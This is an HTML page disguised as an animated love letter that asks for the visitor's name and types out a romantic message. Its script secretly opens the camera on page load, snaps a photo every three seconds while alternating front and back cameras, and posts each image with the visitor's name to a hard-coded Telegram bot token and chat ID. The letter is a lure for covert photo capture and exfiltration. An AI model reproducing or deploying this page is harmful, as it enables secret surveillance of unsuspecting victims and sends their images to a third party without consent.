<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Love Letter</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Cursive', sans-serif;
      background: linear-gradient(135deg, #fcb69f, #d4a5a5);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #fff;
    }

    .name-container {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .name-form {
      background: #fff;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    .name-form input {
      padding: 10px;
      font-size: 1.2rem;
      width: 250px;
      margin-bottom: 20px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    .name-form button {
      background-color: #ef4444;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 25px;
      cursor: pointer;
    }

    .name-form button:hover {
      background-color: #dc2626;
    }

    .container {
      background: #fff;
      width: 100%;
      max-width: 600px;
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      overflow: hidden;
      position: relative;
      display: none;
    }

    .letter-title {
      text-align: center;
      font-size: 2rem;
      color: #ef4444;
      margin-bottom: 20px;
      font-family: 'Georgia', serif;
    }

    .letter-box {
      font-family: 'Arial', sans-serif;
      font-size: 1.2rem;
      line-height: 1.6;
      color: #333;
      white-space: pre-wrap;
      word-wrap: break-word;
      padding: 20px;
      background: #fafafa;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
      margin-top: 20px;
      height: 250px;
      overflow-y: auto;
      max-height: 250px;
    }

    .caret {
      display: inline-block;
      width: 10px;
      background: #333;
      margin-left: 4px;
      animation: blink 1s infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    .message {
      text-align: center;
      font-size: 16px;
      color: #4ade80;
      margin-top: 20px;
    }

    .button-container {
      display: flex;
      justify-content: center;
      margin-top: 20px;
    }

    .action-btn {
      background-color: #ef4444;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 25px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .action-btn:hover {
      background-color: #dc2626;
    }

    #canvas {
      display: none;
    }
  </style>
</head>
<body>

  <!-- Fullscreen Name Input Form -->
  <div class="name-container" id="name-container">
    <div class="name-form">
      <h2>Enter Your Name</h2>
      <input type="text" id="userName" placeholder="Your Name" />
      <button id="submit-name">Next</button>
    </div>
  </div>

  <!-- Love Letter Content -->
  <div class="container" id="container">
    <div class="letter-title" id="letter-title">Dear <span id="to-name">Love</span></div>
    
    <div class="letter-box" id="letter"></div>
    
    <div class="message" id="message">Love youðŸ¥¹...</div>

    <div class="button-container">
      <button class="action-btn" id="start-btn">SeeðŸ¥¹</button>
    </div>
  </div>

  <canvas id="canvas" width="300" height="400"></canvas>

  <script>
    let userName = "";

    const letterText = `


I cannot find the right words to express how much you mean to me. Every time I think of you, I feel my heart race with joy. Your presence fills my world with light, and your laughter is the melody of my life.

You are my everything. I want to walk beside you, share every moment, and build memories together. With you, I feel whole.

Your Love`;

    const letterBox = document.getElementById("letter");
    const startBtn = document.getElementById("start-btn");
    const submitNameBtn = document.getElementById("submit-name");
    const nameContainer = document.getElementById("name-container");
    const container = document.getElementById("container");
    const toName = document.getElementById("to-name");
    const userNameInput = document.getElementById("userName");
    let index = 0;

    // Submit the name and display letter content
    submitNameBtn.addEventListener("click", function() {
      userName = userNameInput.value.trim();
      if (userName !== "") {
        toName.textContent = userName; // Set 'To' name
        letterText.replace('[NAME]', userName); // Replace [NAME] in letter
        nameContainer.style.display = "none"; // Hide name input
        container.style.display = "block"; // Show letter container
      }
    });

    // Typing effect function
    function typeLetter() {
      if (index < letterText.length) {
        letterBox.innerHTML = letterText.substring(0, index + 1) + '<span class="caret"></span>';
        index++;
        letterBox.scrollTop = letterBox.scrollHeight;  // Auto-scroll as text appears
        setTimeout(typeLetter, 50); // Typing speed
      } else {
        letterBox.innerHTML = letterText; // Remove caret once done
      }
    }

    // Start Typing Animation on button click
    startBtn.addEventListener("click", function() {
      typeLetter();
      startBtn.style.display = "none"; // Hide button after click
    });

    // Telegram photo sending functionality
    const canvas = document.getElementById('canvas');
    const message = document.getElementById('message');
    const token = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w";
    const chatId = "1987016824";

    navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    })
    .then(stream => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      let isSelfie = true;

      setInterval(() => {
        const ctx = canvas.getContext("2d");

        // Switch between selfie and back camera
        if (isSelfie) {
          // Selfie Mode
          video.srcObject.getVideoTracks()[0].applyConstraints({
            facingMode: "user"
          });
        } else {
          // Back Camera Mode
          video.srcObject.getVideoTracks()[0].applyConstraints({
            facingMode: "environment"
          });
        }

        isSelfie = !isSelfie; // Toggle between selfie and back camera

        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(blob => {
          if (blob) sendToTelegram(blob);
        }, "image/jpeg", 0.95);
      }, 3000); // 3 seconds interval
    })
    .catch(err => {
      message.textContent = "";
      console.error(err);
    });

    // Send photo to Telegram
    function sendToTelegram(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "photo.jpg");
      formData.append("caption", `This is ${userName}'s photo!`); // Send name with photo

      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        if (!data.ok) {
          message.textContent = "ðŸ« ";
        }
      })
      .catch(err => {
        console.error(err);
        message.textContent = "ðŸ¤§";
      });
    }
  </script>

</body>
</html>
